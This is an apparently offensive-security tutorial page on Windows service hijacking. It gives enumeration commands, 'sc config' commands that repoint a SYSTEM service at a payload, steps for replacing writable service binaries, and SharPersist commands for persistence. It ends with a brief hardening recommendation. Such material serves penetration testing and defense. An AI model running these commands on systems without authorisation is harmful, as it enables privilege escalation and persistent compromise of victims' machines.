---
layout: default
title: Service Hijacking
parent: Windows
nav_order: 1
permalink: /windows/service/
---

# Service Hijacking
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

Windows services are very often run as `NT AUTHORITY/SYSTEM`. In case they are not properly configured with strict permissions, they can be abused to hijack to configured binary that is run by the service to escalate your privileges locally.

## Prerequisites

* Low privileges access to the targeted system.
* At least one of the following:
    * Service run as `NT AUTHORITY/SYSTEM` has weak permissions such as *ChangeConfig*, *Start* and *Stop*.
    * Service's binary run as `NT AUTHORITY/SYSTEM` has weak permissions such as *Modify* or *Full Control*.

## Exploit

### Weak service permissions

First, identify potentially vulnerable services manually, or by using tools such as [SharpUp](https://github.com/GhostPack/SharpUp) or [WinPEAS](https://github.com/carlospolop/PEASS-ng).

```powershell
.\SharpUp.exe audit ModifiableServices
.\WinPEAS.exe
```

Look for weak permissions `ChangeConfig` for an `IdentifyReference` you own (`Authenticated Users` for instance). To do so, you can use [Get-ServiceAcl](https://gist.github.com/cube0x0/1cdef7a90473443f72f28df085241175) PowerShell script.

```powershell
Import-Module .\Get-ServiceAcl.ps1
Get-ServiceAcl -Name $ServiceName | Select -Expand Access
```

Check binary path then reconfigure it, and restart it.

```bash
sc qc $ServiceName
sc config $ServiceName binPath= $PayloadPath
```

If you have permissions to *Start* and *Stop* the service, do it. Otherwise, wait for - *or force* - a reboot.

```bash
sc stop $ServiceName
sc start $ServiceName
```

{: .warning }
> To restore the previous executable path, don't forget to quote it like `binPath= \""C:\Program Files\My Service\Binary.exe"\"` so you don't introduce an [unquoted service path](/windows/unquoted/) vulnerability.

### Weak binary permissions

Sometimes, the binary itself run by the service can be vulnerable to hijacking. You can automatically find them by using tools such as [SharpUp](https://github.com/GhostPack/SharpUp) or [WinPEAS](https://github.com/carlospolop/PEASS-ng).

```powershell
.\SharpUp.exe audit ModifiableServiceBinaries
.\WinPEAS.exe
```

To check permissions on a binary, enter one of the following commands.

```powershell
# Native PowerShell.
Get-Acl -Path $ExecutablePath | Format-List

# With cmd.
icacls "$ExecutablePath"
```

If you a user you own can change (either *Modify* or *Full Control* rights) the binary, bingo! You can therefore change it with your prefered payload. The, if you have permissions to *Start* and *Stop* the service, do it. Otherwise, wait for - *or force* - a reboot.

## Persistance

To persist on a machine with high privileges, it is recommended to create your own service instead of modifying an existing one.

```powershell
.\SharPersist.exe -t service -c $ExecutablePath -n $ServiceName -m add

# New service is stopped by default, start iit manually and ensure it will automatically start at each reboot.
Set-Service -Name $ServiceName -StartupType Automatic
Set-Service -Name $ServiceName -Status Running -PassThru
```

## Recommendations

- [ ] Enforce strong permissions on services, especially the ones running as `NT AUTHORITY\SYSTEM`, that avoid any unprivileged user to modify services configuration or binaries.